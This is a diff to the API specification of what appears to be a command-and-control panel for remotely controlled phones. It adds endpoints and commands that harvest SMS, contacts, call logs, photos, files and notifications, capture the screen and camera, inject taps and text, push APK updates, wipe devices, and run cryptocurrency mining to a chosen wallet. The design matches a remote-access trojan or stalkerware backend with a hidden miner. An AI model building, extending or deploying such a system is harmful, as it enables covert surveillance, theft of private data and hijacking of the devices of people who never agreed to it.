@@ -122,13 +122,28 @@ Legend: `silent refresh` = exactly one refresh-token exchange on 401, then retry
 | P9 | GET | /api/devices/{id}/photos | Photo inventory + `{counts:{original,hidden,deleted}}` | Bearer access |
 | P10 | POST | /api/devices/{id}/photos/report | Agent inventory upsert (device-only) | device credential |
 | P11 | POST | /api/devices/{id}/files | Agent artifact upload (b64 + sha256) → drop dir, dedup by hash | device credential |
-| P12 | GET | /api/devices/{id}/files | `{count, dir}` — "Downloaded: X" | Bearer access |
+| P12 | GET | /api/devices/{id}/files | `{count, dir, files[]}` — artifact rows (id/kind/category/bytes/sha256/createdAt, ≤300) | Bearer access **or** device credential (own rows only) |
 | P13 | GET | /api/devices/{id}/events | SSE stream — instant command push (`data: {cmd}`) | device credential |
 | P14 | POST | /api/devices/{id}/commands/{cid}/result | Agent reports `executed|failed` + result | device credential |
-| P15 | POST | /api/devices/{id}/heartbeat | 15 s heartbeat `{gender, stats}` | device credential |
+| P15 | POST | /api/devices/{id}/heartbeat | 15 s heartbeat `{gender, stats, miner, screen}` | device credential |
+
+## v3 endpoints (implemented)
+
+|| # | Method | Path | Purpose | Auth |
+||---|--------|------|---------|------|
+|| P16 | GET | /api/devices/{id}/files/{fileId}/content | Stream one artifact (frame/file/dump) with sane mime | Bearer access, owner-scoped |
+|| P17 | POST | /api/devices/enroll-token | Mint single-use enroll JWT (30 min), bound to issuing user | Bearer access |
+|| P18 | POST | /api/devices/{id}/enroll-token | Re-issue enroll JWT for an existing device | Bearer access, owner-scoped |
+|| P19 | POST | /api/devices/{id}/mining/start | `{algo,pool,wallet,threads}` → queues `mine_start`, arms STARTING | Bearer access, owner-scoped |
+|| P20 | POST | /api/devices/{id}/mining/stop | Queues `mine_stop` | Bearer access, owner-scoped |
+|| P21 | GET | /api/devices/{id}/mining | `{minerState, hashrate[], sessions[]}` | Bearer access, owner-scoped |
+|| P22 | POST | /api/devices/{id}/phone/reveal | Returns decrypted phone, writes audit | Bearer access, owner-scoped |
 
 Notes:
 - `GET /devices/{id}/commands` accepts **both** auth kinds: user (owner) and device credential.
-- Command vocabulary: `ping, wipe, camera, pull_photos, screen_capture, sms, contacts, call_log, mine`.
+- Command vocabulary: `ping, wipe, camera, pull_photos, screen_capture, sms, contacts, call_log, mine_start, mine_stop, input_tap, input_swipe, input_text, files_pull, notifications_pull, apk_update`.
+- `input_*` payloads: tap `{x,y}`, swipe `{x1,y1,x2,y2,ms}`, text `{text}` — coordinates normalized 0..1.
+- `files_pull` payload `{category: documents|downloads|audio|video, limit≤50}`; uploads land as `kind=file category=<cat>`.
+- `notifications_pull` dumps the on-device 500-entry ring → `kind=dump category=notifications` JSON `[{pkg,title,text,atMs}]`.
 - `wipe` → `executed` flips `Device.formattedAt` + `status=formatted` (dashboard "محذوف").
 - File drop: `PANEL_DROP_DIR/{deviceId}/{category}/{ts}_{name}`, SHA-256 dedup via `DownloadedFile`.
